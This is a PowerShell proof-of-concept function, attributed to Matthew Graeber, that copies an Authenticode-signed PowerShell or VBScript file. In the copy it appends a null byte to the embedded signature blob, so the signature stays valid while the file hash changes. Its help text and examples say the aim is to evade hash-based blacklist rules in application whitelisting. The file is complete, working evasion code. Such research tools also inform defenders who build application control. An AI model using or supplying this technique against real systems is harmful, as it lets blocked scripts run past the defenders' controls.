function Copy-AuthenticodeSignedFile {
<#
.SYNOPSIS

Creates a copy of an Authenticode-signed PowerShell file that has a unique file hash but retains its valid signature.

.DESCRIPTION

Copy-AuthenticodeSignedFile creates a copy of an Authenticode-signed PowerShell file that has a unique file hash but retains its valid signature. This is used to bypass application whitelisting hash-based blacklist rules.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.PARAMETER Path

Specifies the path to an Authenticode-signed PowerShell file.

.PARAMETER DestinationPath

Specifies the path the the new PowerShell file that will be created that preserves the Authenticode signature but has a different file hash.

.EXAMPLE

Copy-AuthenticodeSignedFile -Path Blacklisted.ps1 -DestinationPath NoLongerBlacklisted.ps1

.EXAMPLE

Get-Item Blacklisted.ps1 | Copy-AuthenticodeSignedFile -DestinationPath NoLongerBlacklisted.ps1

.INPUTS

System.IO.FileInfo

Accept file info from Get-ChildItem or Get-Item over the pipeline.

.OUTPUTS

System.Management.Automation.Signature

Outputs the result of Get-Authenticode signature on the new file.

#>

    [OutputType('System.Management.Automation.Signature')]
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
        [String]
        [Alias('Fullname')]
        [ValidateNotNullOrEmpty()]
        $Path,

        [Parameter(Mandatory)]
        [String]
        $DestinationPath
    )

    $FileInfo = Get-Item -Path $Path -ErrorAction Stop

    $IsPowerShell = $False
    $IsWSH = $False

    # This could be extended to support any signable file format. This is just a PoC however.
    switch ($FileInfo.Extension) {
        '.ps1'  { $IsPowerShell = $True }
        '.psm1' { $IsPowerShell = $True }
        '.psd1' { $IsPowerShell = $True }
        '.vbs'  { $IsWSH = $True }
        default { throw "$Path is not a valid PowerShell or VBScript file." }
    }

    $SignerInfo = Get-AuthenticodeSignature -FilePath $Path -ErrorAction Stop

    if ($IsPowerShell) {
        if (-not (Get-Content -Path $Path | Select-String -SimpleMatch '# SIG # Begin signature block')) {
            throw "$Path is not Authenticode signed. Copy-AuthenticodeSignedFile only works if the file has an embedded Authenticode signature."
        }

        $SignatureBlob = Get-Content $Path | Where-Object { (-not $_.StartsWith('# SIG')) -and ($_.StartsWith('# ')) }
        $SignatureBlobRaw = ($SignatureBlob | Out-String).TrimEnd()

        # Reassemble the Base64-encoded string
        $EncodedSignature = ($SignatureBlob | ForEach-Object { $_.Substring(2) }) -join ''

        # Decode the signature blob and append a null to it.
        [Byte[]] $SignatureBytes = [Convert]::FromBase64String($EncodedSignature) + @([Byte] 0)

        $NewEncodedSignatureBlob = [Convert]::ToBase64String($SignatureBytes) -split '(\S{64})' | Where-Object { $_ } | ForEach-Object { "# $_" } | Out-String
    }

    if ($IsWSH) {
        if (-not (Get-Content -Path $Path | Select-String -SimpleMatch "'' SIG '' Begin signature block")) {
            throw "$Path is not Authenticode signed. Copy-AuthenticodeSignedFile only works if the file has an embedded Authenticode signature."
        }

        $SignatureBlob = Get-Content $Path | Where-Object { (-not $_.StartsWith("'' SIG '' Begin")) -and (-not $_.StartsWith("'' SIG '' End")) -and ($_.StartsWith("'' SIG '' ")) }
        $SignatureBlobRaw = ($SignatureBlob | Out-String).TrimEnd()

        $EncodedSignature = ($SignatureBlob | ForEach-Object { $_.Substring(10) }) -join ''

        # Decode the signature blob and append a null to it.
        [Byte[]] $SignatureBytes = [Convert]::FromBase64String($EncodedSignature) + @([Byte] 0)

        $NewEncodedSignatureBlob = [Convert]::ToBase64String($SignatureBytes) -split '(\S{44})' | Where-Object { $_ } | ForEach-Object { "'' SIG '' $_" } | Out-String
    }

    $FileContent = Get-Content $Path -Raw
    $FileContent.Replace($SignatureBlobRaw, $NewEncodedSignatureBlob.TrimEnd()).TrimEnd() | Out-File -FilePath $DestinationPath

    Get-AuthenticodeSignature -FilePath $DestinationPath
}